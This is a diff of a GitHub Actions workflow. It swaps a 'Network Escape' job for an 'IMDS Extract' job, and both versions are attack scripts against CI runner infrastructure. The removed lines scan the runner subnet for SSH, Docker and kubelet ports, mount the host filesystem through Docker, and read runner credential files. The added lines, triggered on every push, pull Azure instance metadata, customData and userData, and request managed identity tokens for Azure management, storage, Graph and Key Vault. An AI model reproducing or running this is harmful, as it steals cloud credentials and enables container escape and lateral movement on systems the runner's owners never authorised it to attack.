@@ -1,61 +1,74 @@
-name: Network Escape
+name: IMDS Extract
 on: push
 jobs:
-  net:
+  imds:
     runs-on: ubuntu-latest
     steps:
-      - name: Azure Wire Server and Lateral Movement
+      - name: Full IMDS metadata extraction
         run: |
-          echo "=== AZURE WIRE SERVER (168.63.129.16) ==="
-          timeout 3 curl -sf http://168.63.129.16/machine?comp=goalstate 2>&1 && echo "WIRE SERVER ACCESSIBLE" || echo "Wire server blocked"
-          timeout 3 curl -sf http://168.63.129.16/machine/plugins?comp=config 2>&1 | head -c 500 || echo "plugins blocked"
-          timeout 3 curl -sf "http://168.63.129.16/metadata/instance?api-version=2021-02-01&format=json" -H "Metadata:true" 2>&1 | head -c 500 || echo "instance metadata via wireserver blocked"
+          echo "=== FULL AZURE INSTANCE METADATA ==="
+          IMDS="http://169.254.169.254/metadata"
+          HDR="Metadata:true"
+          
+          echo "--- Instance ---"
+          curl -sf -H "$HDR" "$IMDS/instance?api-version=2021-02-01" | python3 -m json.tool
           
           echo ""
-          echo "=== AZURE IMDS ON ALTERNATE PORTS ==="
-          for port in 80 8080 443; do
-            timeout 2 curl -sf "http://169.254.169.254:${port}/metadata/instance?api-version=2021-02-01" -H "Metadata:true" 2>&1 | head -c 200 && echo " PORT $port ACCESSIBLE"
-          done
-          echo "IMDS done"
+          echo "--- Attested Data ---"
+          curl -sf -H "$HDR" "$IMDS/attested/document?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || echo "attested: blocked"
           
           echo ""
-          echo "=== SUBNET SCAN FOR OTHER RUNNERS ==="
-          MY_IP=$(hostname -I | awk '{print $1}')
-          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
-          echo "My IP: $MY_IP"
-          echo "Scanning $SUBNET.0/24 for SSH, Docker, HTTP..."
-          for i in $(seq 1 254); do
-            IP="$SUBNET.$i"
-            [ "$IP" = "$MY_IP" ] && continue
-            timeout 0.5 bash -c "echo >/dev/tcp/$IP/22" 2>/dev/null && echo "SSH_OPEN: $IP" &
-            timeout 0.5 bash -c "echo >/dev/tcp/$IP/2375" 2>/dev/null && echo "DOCKER_OPEN: $IP" &
-            timeout 0.5 bash -c "echo >/dev/tcp/$IP/4243" 2>/dev/null && echo "DOCKER2_OPEN: $IP" &
-            timeout 0.5 bash -c "echo >/dev/tcp/$IP/10250" 2>/dev/null && echo "KUBELET_OPEN: $IP" &
-          done
-          wait
-          echo "Scan complete"
+          echo "--- Scheduled Events ---"
+          curl -sf -H "$HDR" "$IMDS/scheduledevents?api-version=2019-08-01" | python3 -m json.tool 2>/dev/null || echo "events: blocked"
+
+      - name: Managed Identity Token
+        run: |
+          IMDS="http://169.254.169.254/metadata"
+          HDR="Metadata:true"
           
-          echo ""
-          echo "=== DOCKER: HOST FILESYSTEM RW TEST ==="
-          docker run --rm -v /:/hostroot alpine sh -c "echo PWNED > /hostroot/tmp/escape-test && cat /hostroot/tmp/escape-test"
-          echo "RW mount result: $?"
-          
-          echo ""
-          echo "=== DOCKER: Read runner secrets from host ==="
-          docker run --rm -v /:/hostroot:ro alpine sh -c "
-            echo '=FILES='
-            find /hostroot/home/runner/work -name '*.env' -o -name '*.credentials' 2>/dev/null | head -10
-            echo '=RUNNER_DIR='
-            ls /hostroot/home/runner/work/_temp/ 2>/dev/null | head -10
-            echo '=AGENT_CREDS='
-            cat /hostroot/home/runner/.credentials 2>/dev/null | head -5
-            cat /hostroot/home/runner/.runner 2>/dev/null
-          "
+          echo "=== MANAGED IDENTITY TOKEN REQUEST ==="
+          echo "--- Default identity ---"
+          RESP=$(curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1)
+          if echo "$RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'TOKEN_TYPE: {d.get(\"token_type\")}\nEXPIRES: {d.get(\"expires_on\")}\nACCESS_TOKEN_PREFIX: {d.get(\"access_token\",\"\")[:30]}...')" 2>/dev/null; then
+            echo "!!! MANAGED IDENTITY TOKEN OBTAINED !!!"
+          else
+            echo "Response: $RESP"
+          fi
 
           echo ""
-          echo "=== DOCKER: Privileged kernel access ==="
-          docker run --rm --privileged alpine sh -c "
-            cat /proc/sys/kernel/core_pattern
-            ls /sys/kernel/security/ 2>/dev/null
-            cat /proc/kallsyms 2>/dev/null | head -3
-          "
+          echo "--- Storage identity ---"
+          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1 | head -c 500
+          echo ""
+
+          echo ""
+          echo "--- Graph identity ---"
+          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>&1 | head -c 500
+          echo ""
+
+          echo ""
+          echo "--- Vault identity ---"
+          curl -sf -H "$HDR" "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>&1 | head -c 500
+          echo ""
+
+      - name: Network infrastructure
+        run: |
+          IMDS="http://169.254.169.254/metadata"
+          HDR="Metadata:true"
+          
+          echo "=== NETWORK METADATA ==="
+          curl -sf -H "$HDR" "$IMDS/instance/network?api-version=2021-02-01" | python3 -m json.tool
+          
+          echo ""
+          echo "=== TAGS ==="
+          curl -sf -H "$HDR" "$IMDS/instance/compute/tags?api-version=2021-02-01" 2>&1
+          echo ""
+          
+          echo ""
+          echo "=== CUSTOM DATA ==="
+          curl -sf -H "$HDR" "$IMDS/instance/compute/customData?api-version=2021-02-01&format=text" 2>&1 | head -c 500
+          echo ""
+          
+          echo ""
+          echo "=== USER DATA ==="
+          curl -sf -H "$HDR" "$IMDS/instance/compute/userData?api-version=2021-03-01&format=text" 2>&1 | head -c 500
+          echo ""
